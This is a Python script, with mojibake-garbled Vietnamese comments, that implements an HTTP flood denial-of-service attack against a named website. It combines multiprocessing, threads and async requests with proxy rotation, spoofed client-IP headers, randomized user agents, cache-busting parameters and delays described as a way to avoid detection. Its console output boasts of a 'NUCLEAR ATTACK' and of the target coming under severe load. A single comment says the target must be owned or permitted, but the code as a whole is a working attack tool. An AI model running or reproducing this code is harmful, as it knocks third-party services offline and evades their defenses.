import requests
import threading
import time
import signal
import sys
import random
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp
import multiprocessing
from urllib.parse import urljoin
import itertools

# URL c·ªßa m√°y ch·ªß c·∫ßn ki·ªÉm tra (ph·∫£i l√† m√°y ch·ªß b·∫°n s·ªü h·ªØu ho·∫∑c c√≥ s·ª± cho ph√©p)
TARGET_URL = "https://tjkw11.com/"
NUM_THREADS = 50  # Gi·∫£m threads ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán
MAX_WORKERS = 100  # Gi·∫£m workers
ASYNC_THREADS = 10  # Gi·∫£m async threads
CONCURRENT_REQUESTS = 20  # Gi·∫£m concurrent requests

# C·∫•u h√¨nh ƒë·ªÉ tr√°nh b·ªã block
USE_PROXIES = True  # B·∫≠t/t·∫Øt s·ª≠ d·ª•ng proxy
USE_DELAYS = True   # B·∫≠t/t·∫Øt delay ng·∫´u nhi√™n
MIN_DELAY = 0.1     # Delay t·ªëi thi·ªÉu (gi√¢y)
MAX_DELAY = 2.0     # Delay t·ªëi ƒëa (gi√¢y)
ROTATE_IP_HEADERS = True  # B·∫≠t/t·∫Øt gi·∫£ m·∫°o IP headers

# Danh s√°ch User-Agent ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán (m·ªü r·ªông)
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
]

# Danh s√°ch proxy mi·ªÖn ph√≠ (c·∫ßn c·∫≠p nh·∫≠t th∆∞·ªùng xuy√™n)
FREE_PROXIES = [
    # HTTP Proxies
    'http://103.149.162.194:80',
    'http://103.149.162.195:80',
    'http://185.162.231.106:80',
    'http://185.162.231.107:80',
    'http://103.152.112.162:80',
    'http://103.152.112.145:80',
    'http://194.182.163.117:3128',
    'http://194.182.163.118:3128',
    # SOCKS5 Proxies
    'socks5://103.149.162.194:1080',
    'socks5://185.162.231.106:1080',
    'socks5://103.152.112.162:1080',
]

# Danh s√°ch IP gi·∫£ ƒë·ªÉ th√™m v√†o headers
FAKE_IPS = [
    '192.168.1.{}'.format(random.randint(1, 254)),
    '10.0.0.{}'.format(random.randint(1, 254)),
    '172.16.0.{}'.format(random.randint(1, 254)),
    '203.0.113.{}'.format(random.randint(1, 254)),
    '198.51.100.{}'.format(random.randint(1, 254)),
    '8.8.8.{}'.format(random.randint(1, 254)),
    '1.1.1.{}'.format(random.randint(1, 254)),
]

# Iterator ƒë·ªÉ xoay proxy
proxy_cycle = itertools.cycle(FREE_PROXIES) if FREE_PROXIES else None

# C√°c ƒë∆∞·ªùng d·∫´n ph·ªï bi·∫øn ƒë·ªÉ t·∫•n c√¥ng
ATTACK_PATHS = [
    '/',
    '/index.html',
    '/index.php',
    '/home',
    '/about',
    '/contact',
    '/login',
    '/admin',
    '/wp-admin',
    '/api',
    '/search',
    '/products',
    '/services',
]

# C√°c ph∆∞∆°ng th·ª©c HTTP
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS']

# Bi·∫øn ƒë·ªÉ ki·ªÉm so√°t vi·ªác d·ª´ng c√°c lu·ªìng
stop_threads = False
request_count = 0
request_lock = threading.Lock()

def signal_handler(sig, frame):
    global stop_threads
    print('\nƒêang d·ª´ng ch∆∞∆°ng tr√¨nh...')
    stop_threads = True
    sys.exit(0)

def get_random_headers():
    """T·∫°o headers ng·∫´u nhi√™n ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice([
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
        ]),
        'Accept-Language': random.choice([
            'en-US,en;q=0.9',
            'en-US,en;q=0.5',
            'vi-VN,vi;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8',
        ]),
        'Accept-Encoding': random.choice([
            'gzip, deflate, br',
            'gzip, deflate',
            'gzip',
        ]),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Pragma': 'no-cache',
        'DNT': '1',
        'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
        'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
    }
    
    # Th√™m headers gi·∫£ m·∫°o IP n·∫øu ƒë∆∞·ª£c b·∫≠t
    if ROTATE_IP_HEADERS:
        fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ip_headers = random.choice([
            {'X-Forwarded-For': fake_ip},
            {'X-Real-IP': fake_ip},
            {'X-Originating-IP': fake_ip},
            {'X-Remote-IP': fake_ip},
            {'X-Client-IP': fake_ip},
            {'CF-Connecting-IP': fake_ip},
            {'True-Client-IP': fake_ip},
            {'X-Forwarded-For': fake_ip, 'X-Real-IP': fake_ip},
        ])
        headers.update(ip_headers)
    
    # Th√™m referer ng·∫´u nhi√™n
    if random.choice([True, False]):
        referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://www.twitter.com/',
            'https://www.instagram.com/',
            'https://www.linkedin.com/',
        ]
        headers['Referer'] = random.choice(referers)
    
    return headers

def get_random_proxy():
    """L·∫•y proxy ng·∫´u nhi√™n t·ª´ danh s√°ch"""
    if not USE_PROXIES or not FREE_PROXIES:
        return None
    
    try:
        proxy_url = next(proxy_cycle)
        if proxy_url.startswith('http://'):
            return {'http': proxy_url, 'https': proxy_url}
        elif proxy_url.startswith('socks5://'):
            return {'http': proxy_url, 'https': proxy_url}
        return None
    except:
        return None

def apply_delay():
    """√Åp d·ª•ng delay ng·∫´u nhi√™n n·∫øu ƒë∆∞·ª£c b·∫≠t"""
    if USE_DELAYS:
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        time.sleep(delay)

def send_request_sync():
    """G·ª≠i request ƒë·ªìng b·ªô v·ªõi session ƒë·ªÉ t√°i s·ª≠ d·ª•ng k·∫øt n·ªëi"""
    global request_count
    session = requests.Session()
    
    # T·ªëi ∆∞u session
    session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50))
    session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50))
    
    while not stop_threads:
        try:
            # √Åp d·ª•ng delay tr∆∞·ªõc khi g·ª≠i request
            apply_delay()
            
            headers = get_random_headers()
            proxies = get_random_proxy()
            
            # Th√™m tham s·ªë ng·∫´u nhi√™n ƒë·ªÉ tr√°nh cache
            params = {
                't': int(time.time() * 1000), 
                'r': random.randint(1, 999999),
                'cache_bust': random.randint(1, 999999),
                'v': random.choice(['1.0', '2.0', '3.0']),
                'ref': random.randint(1, 9999)
            }
            
            # Random method v√† path
            method = random.choice(HTTP_METHODS)
            path = random.choice(ATTACK_PATHS)
            url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
            
            # C·∫•u h√¨nh request v·ªõi proxy v√† timeout d√†i h∆°n
            request_kwargs = {
                'headers': headers,
                'params': params,
                'timeout': (5, 10),  # (connect_timeout, read_timeout)
                'allow_redirects': True,
                'verify': False,  # B·ªè qua SSL verification
            }
            
            if proxies:
                request_kwargs['proxies'] = proxies
            
            if method == 'GET':
                response = session.get(url, **request_kwargs)
            elif method == 'POST':
                data = {
                    'data': random.randint(1, 999999),
                    'action': random.choice(['search', 'login', 'submit', 'update']),
                    'token': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
                }
                request_kwargs['data'] = data
                response = session.post(url, **request_kwargs)
            elif method == 'HEAD':
                response = session.head(url, **request_kwargs)
            else:  # OPTIONS
                response = session.options(url, **request_kwargs)
                
            with request_lock:
                request_count += 1
                if request_count % 25 == 0:  # Gi·∫£m spam console
                    proxy_info = f" via {list(proxies.values())[0] if proxies else 'direct'}" if proxies else ""
                    print(f"üî• Request #{request_count} | {method} {path} | Status: {response.status_code}{proxy_info}")
                    
        except requests.exceptions.ProxyError:
            # Proxy l·ªói, th·ª≠ l·∫°i v·ªõi proxy kh√°c ho·∫∑c direct
            continue
        except requests.exceptions.Timeout:
            # Timeout, b·ªè qua
            continue
        except requests.exceptions.RequestException:
            # L·ªói kh√°c, b·ªè qua
            continue
        except Exception:
            # L·ªói kh√¥ng x√°c ƒë·ªãnh
            continue

async def send_request_async(session):
    """G·ª≠i request b·∫•t ƒë·ªìng b·ªô ƒë·ªÉ tƒÉng hi·ªáu su·∫•t"""
    global request_count
    try:
        # √Åp d·ª•ng delay async
        if USE_DELAYS:
            await asyncio.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
        
        headers = get_random_headers()
        params = {
            't': int(time.time() * 1000), 
            'r': random.randint(1, 999999),
            'cache_bust': random.randint(1, 999999),
            'async': '1'
        }
        
        # Random path cho async requests
        path = random.choice(ATTACK_PATHS)
        url = TARGET_URL + path if not TARGET_URL.endswith('/') else TARGET_URL[:-1] + path
        
        # C·∫•u h√¨nh timeout cho async
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        
        async with session.get(url, headers=headers, params=params, timeout=timeout, ssl=False) as response:
            with request_lock:
                request_count += 1
                if request_count % 30 == 0:
                    print(f"‚ö° Async Request #{request_count} | {path} | Status: {response.status}")
    except asyncio.TimeoutError:
        # Timeout, b·ªè qua
        pass
    except aiohttp.ClientError:
        # L·ªói client, b·ªè qua
        pass
    except Exception:
        # L·ªói kh√°c, b·ªè qua
        pass

async def async_attack():
    """T·∫•n c√¥ng b·∫•t ƒë·ªìng b·ªô v·ªõi nhi·ªÅu request c√πng l√∫c"""
    connector = aiohttp.TCPConnector(
        limit=200,  # Gi·∫£m gi·ªõi h·∫°n k·∫øt n·ªëi ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán
        limit_per_host=200,
        ttl_dns_cache=300,
        use_dns_cache=True,
        keepalive_timeout=30,
        enable_cleanup_closed=True,
        ssl=False  # T·∫Øt SSL verification
    )
    timeout = aiohttp.ClientTimeout(total=10, connect=5)  # TƒÉng timeout
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while not stop_threads:
            # T·∫°o nhi·ªÅu task c√πng l√∫c nh∆∞ng √≠t h∆°n ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán
            tasks = []
            for _ in range(CONCURRENT_REQUESTS):
                if stop_threads:
                    break
                task = asyncio.create_task(send_request_async(session))
                tasks.append(task)
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            # Th√™m delay nh·ªè gi·ªØa c√°c batch ƒë·ªÉ tr√°nh b·ªã ph√°t hi·ªán
            if USE_DELAYS:
                await asyncio.sleep(random.uniform(0.1, 0.5))

def run_async_attack():
    """Ch·∫°y t·∫•n c√¥ng b·∫•t ƒë·ªìng b·ªô trong thread ri√™ng"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(async_attack())
    except Exception as e:
        pass
    finally:
        loop.close()

def process_attack():
    """Ch·∫°y attack trong process ri√™ng"""
    global stop_threads
    threads = []
    
    # T·∫°o threads trong process n√†y
    for i in range(NUM_THREADS // 4):  # Chia threads cho c√°c process
        thread = threading.Thread(target=send_request_sync)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Ch·ªù cho ƒë·∫øn khi d·ª´ng
    while not stop_threads:
        time.sleep(1)

def main():
    global stop_threads
    
    # ƒêƒÉng k√Ω signal handler ƒë·ªÉ b·∫Øt Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    cpu_count = multiprocessing.cpu_count()
    print(f"üöÄ Starting STEALTH ATTACK on {TARGET_URL}")
    print("ÔøΩüí•üí• NUCLEAR ATTACK MODE üí•üí•üí•")
    print(f"   - {cpu_count} CPU cores detected")
    print(f"   - {NUM_THREADS} synchronous threads (NO DELAY)")
    print(f"   - {ASYNC_THREADS} async threads")
    print(f"   - {CONCURRENT_REQUESTS} concurrent requests per async thread")
    print(f"   - Multiple HTTP methods (GET, POST, HEAD, OPTIONS)")
    print(f"   - Multiple attack paths")
    print(f"   - Total potential: {NUM_THREADS + (ASYNC_THREADS * CONCURRENT_REQUESTS)} concurrent requests")
    print("   - Random headers and parameters")
    print("   - Optimized connection pooling")
    print("   - Maximum timeout reduction")
    print("   - Multi-process architecture")
    print("‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è  NUCLEAR MODE - Press Ctrl+C to stop... ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è")
    print("=" * 80)
    
    threads = []
    processes = []
    
    # T·∫°o multiple processes ƒë·ªÉ t·∫≠n d·ª•ng t·∫•t c·∫£ CPU cores
    print(f"üöÄ Starting {cpu_count} attack processes...")
    for i in range(cpu_count):
        process = multiprocessing.Process(target=process_attack, name=f"AttackProcess-{i+1}")
        process.daemon = True
        processes.append(process)
        process.start()
    
    # T·∫°o c√°c thread ƒë·ªìng b·ªô v·ªõi s·ªë l∆∞·ª£ng l·ªõn
    print(f"üî• Starting {NUM_THREADS} synchronous attack threads...")
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_request_sync, name=f"SyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # T·∫°o nhi·ªÅu thread b·∫•t ƒë·ªìng b·ªô
    print(f"‚ö° Starting {ASYNC_THREADS} asynchronous attack threads...")
    for i in range(ASYNC_THREADS):
        thread = threading.Thread(target=run_async_attack, name=f"AsyncThread-{i+1}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    print(f"‚úÖ Started {len(processes)} processes and {len(threads)} threads")
    print(f"üíÄ TOTAL ATTACK VECTORS: {len(processes) * (NUM_THREADS // 4) + len(threads)}")
    
    # Th·ªëng k√™ real-time
    start_time = time.time()
    last_count = 0
    
    try:
        while not stop_threads:
            time.sleep(1)  # C·∫≠p nh·∫≠t nhanh h∆°n
            current_time = time.time()
            elapsed = current_time - start_time
            current_count = request_count
            rps = (current_count - last_count) / 1  # Requests per second
            
            print(f"ÔøΩ NUCLEAR STATS: {current_count} requests | RPS: {rps:.0f} | Time: {elapsed:.1f}s | üî•ATTACKINGüî•")
            last_count = current_count
            
    except KeyboardInterrupt:
        print("\nüõë NUCLEAR SHUTDOWN INITIATED...")
        stop_threads = True
    
    print("‚è≥ Terminating all attack vectors...")
    
    # Terminate processes
    for process in processes:
        if process.is_alive():
            process.terminate()
    
    time.sleep(3)
    
    # Th·ªëng k√™ cu·ªëi
    total_time = time.time() - start_time
    avg_rps = request_count / total_time if total_time > 0 else 0
    
    print("=" * 80)
    print(f"ÔøΩ NUCLEAR ATTACK COMPLETED üíÄ")
    print(f"   Total Requests Fired: {request_count}")
    print(f"   Total Attack Time: {total_time:.2f} seconds")
    print(f"   Average RPS: {avg_rps:.2f}")
    print(f"   Peak Performance: {max(rps if 'rps' in locals() else 0, avg_rps):.2f} RPS")
    print("üèÅ Target should be experiencing severe load...")

if __name__ == "__main__":
    main()